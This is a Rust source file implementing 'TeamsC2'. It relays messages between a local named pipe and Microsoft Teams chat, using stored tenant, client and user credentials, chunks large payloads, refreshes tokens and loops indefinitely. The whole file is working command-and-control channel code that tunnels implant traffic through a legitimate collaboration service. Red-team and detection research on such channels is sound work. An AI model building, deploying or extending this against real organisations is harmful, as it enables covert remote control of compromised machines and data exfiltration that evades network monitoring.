use std::{error::Error, time::Duration};
use crate::{
    auth::Auth,
    named_pipes::PipeConnection,
    teamsclient::TeamsClient,
};

pub struct TeamsC2 {
    pipe: PipeConnection,
    teams: TeamsClient,
    auth: Auth,
}

#[derive(Clone)]
pub struct Config {
    pub tenant_id: String,
    pub client_id: String,
    pub username: String,
    pub password: String,
}

// Maximum size for a single message
const MAX_MESSAGE_SIZE: usize = 10000;
// Marker for partial messages
const PARTIAL_MESSAGE_MARKER: &str = "partialMessageDetector";
// Delay between retries (milliseconds)
const RETRY_DELAY_MS: u64 = 1500;
// Polling interval (milliseconds)
const POLL_INTERVAL_MS: u64 = 1000;
// Maximum retry attempts
const MAX_RETRIES: u32 = 3;

impl TeamsC2 {
    /// Create a new TeamsC2 instance
    /// 
    /// # Arguments
    /// * `pipe_name` - The name of the named pipe to connect to
    /// * `config` - The configuration for the TeamsC2 instance
    /// 
    /// # Returns
    /// * `Result<TeamsC2, Box<dyn Error>>` - The TeamsC2 instance
    pub async fn new(pipe_name: &str, config: Config) -> Result<Self, Box<dyn Error>> {
        // Connect to the named pipe
        let pipe = PipeConnection::connect(pipe_name)?;

        // Initialize the authentication
        let auth = Auth::new(&config);
        let token = auth.authenticate().await?;

        // Initialize the Teams client
        let teams = TeamsClient::new(token).await?;

        Ok(Self {
            pipe,
            teams,
            auth,
        })
    }

    /// Ensures the auth token is still valid
    async fn ensure_auth(&mut self) -> Result<(), Box<dyn Error>> {
        if !self.teams.is_token_valid() {
            println!("Token expired, refreshing...");
            let token = self.auth.authenticate().await?;
            self.teams.update_token(token).await?;
        }
        Ok(())
    }

    /// Handle large messages
    async fn handle_message_chunks(&self, message: &str) -> Result<(), Box<dyn Error>> {
        // If message is not larger then max size then send it directly
        if message.len() <= MAX_MESSAGE_SIZE {
            return self.teams.send_message(message).await;
        }

        // Split the message into chunks
        let chunks: Vec<&str> = message.as_bytes()
        .chunks(MAX_MESSAGE_SIZE)
        .map(|chunk| std::str::from_utf8(chunk).unwrap())
        .collect();

        // Send each chunk with marker
        for (i, chunk) in chunks.iter().enumerate() {
            let is_last = i == chunks.len() - 1;
            // Append marker to partial messages and if it's the last chunk don't append marker
            let content = if !is_last {
                format!("{}{}", PARTIAL_MESSAGE_MARKER, chunk)
            }
            else {
                chunk.to_string()
            };

            self.teams.send_message(&content).await?;

            // Small delay between chunks to avoid rate limiting
            tokio::time::sleep(Duration::from_millis(100)).await;
        }

        Ok(())
    }

    async fn process_received_message(&mut self, message: &str) -> Result<Option<String>, Box<dyn Error>> {
        match message {
            // Handle empty messages
            "empty" => Ok(Some(" ".to_string())),

            // Handle chunked messages
            msg if msg.contains(PARTIAL_MESSAGE_MARKER) => {
                let mut buffer = String::new();

                let content = msg.replace(PARTIAL_MESSAGE_MARKER, "");
                buffer.push_str(&content);

                // Keep reading until we get the full message
                loop {
                    tokio::time::sleep(Duration::from_millis(RETRY_DELAY_MS)).await;

                    if let Some(next_msg) = self.teams.get_latest_message().await? {
                        if !next_msg.contains(PARTIAL_MESSAGE_MARKER) {
                            // This is the final chunk
                            buffer.push_str(&next_msg);
                            return Ok(Some(buffer));
                        } else {
                            // This is another partial chunk
                            buffer.push_str(&next_msg.replace(PARTIAL_MESSAGE_MARKER, ""));
                        }
                    }
                }
            }

            // Handle regular messages
            _ => Ok(Some(message.to_string()))
        }
    }

    /// Main loop for the TeamsC2 instance
    /// It runs indefinitely, handling communication between the named pipe and Teams
    ///
    pub async fn run(mut self) -> Result<(), Box<dyn Error>> {
        println!("Running TeamsC2...");
        
        loop {
            // Ensure auth token is valid before any operation
            self.ensure_auth().await?;

            // Read from pipe
            match self.pipe.read() {
                Ok(message) => {
                    // Send to Teams with retry on auth failure
                    match self.handle_message_chunks(&message).await {
                        Ok(_) => println!("Message sent successfully"),
                        Err(e) if e.to_string().contains("401") => {
                            println!("Auth failed, retrying...");
                            self.ensure_auth().await?;
                            self.handle_message_chunks(&message).await?;
                        }
                        Err(e) => return Err(e),
                    }

                    // Wait for Teams response with retries
                    let mut retry_count = 0;

                    while retry_count < MAX_RETRIES {
                        tokio::time::sleep(Duration::from_millis(RETRY_DELAY_MS)).await;
                        
                        match self.teams.get_latest_message().await {
                            Ok(Some(response)) => {
                                // Process the response and write to pipe if valid
                                if let Some(processed) = self.process_received_message(&response).await? {
                                    self.pipe.write(&processed)?;
                                    break;
                                }
                            }
                            Ok(None) => {
                                retry_count += 1;
                                continue;
                            }
                            Err(e) if e.to_string().contains("401") => {
                                self.ensure_auth().await?;
                                retry_count += 1;
                                continue;
                            }
                            Err(e) => return Err(e),
                        }
                    }
                }
                Err(e) => {
                    println!("Error reading from pipe: {}", e);
                    tokio::time::sleep(Duration::from_millis(POLL_INTERVAL_MS)).await;
                }
            }
        }
    }
}